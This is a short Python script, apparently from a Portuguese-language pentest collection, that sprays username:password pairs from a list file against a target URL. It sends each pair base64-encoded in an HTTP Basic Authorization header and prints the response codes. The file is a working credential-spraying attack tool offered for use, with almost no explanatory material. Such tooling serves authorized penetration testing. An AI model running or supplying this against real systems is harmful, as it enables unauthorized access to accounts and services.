#!/usr/bin/python

#############################################################################
#   Projeto:        Pentest Scripts - CVEs                                  #
#   Nome:           Password Spray Basic Authorizarion                      #
#   Descrição:      Passowrd Spray with Basic Authorization                 #
#   Autor:          Carine Constantino                                      #
#   Data:           19/02/2022                                              #                                      
#   Função:         Script para executar password spray usando o método     #  
#                   Basic Authorization em base64.                          #
#                                                                           #
#############################################################################

import requests
from requests.auth import HTTPBasicAuth
import base64
from pyfiglet import Figlet
import argparse

print('--------------------------------------------')
desenho  = Figlet(font='eftiwall')
banner_desenho = desenho.renderText('rtz')
fonte = Figlet(font='contessa')
banner_fonte = fonte.renderText('Password Spray Basic Authorization')

print(banner_desenho)
print(banner_fonte)
print('--------------------------------------------')
print('Create By: Carine Constantino\n') 
print('carine.constantino@hotmail.com')
print('--------------------------------------------')

class Scan:

    def __init__(self, target):
        
        self.url = target

if __name__ == '__main__':

    program_name  = argparse.ArgumentParser(description = 'Password Spray Basic Authorization')
    program_name.add_argument('--target', action='store', dest='target',
                                            required = True, help = ''' Informe uma URL para executar o attack-test :::
                                            Exemplo: python3 password-spray-basic-authorization.py --target https://example.com.br ''')
                                            
    argumentos_parser = program_name.parse_args()
    target = argumentos_parser.target
    
def attack():
    payload = 'User-Password-List'
    open_file = open(payload, "r")
    for linha in open_file.readlines():
        encode_payload = base64.b64encode(linha.encode()).decode()
        req = requests.post(target, headers={"Authorization": "Basic %s"% encode_payload})
        print('------------------------------------------------------')
        print('Account:', linha)
        print('ATTACK!!!')
        print('------------------------------------------------------')
        print('Encoded Payload:', encode_payload)
        print('Request Header', req.request.headers['Authorization'])
        print('Reponse Target', req.status_code)



attack()        
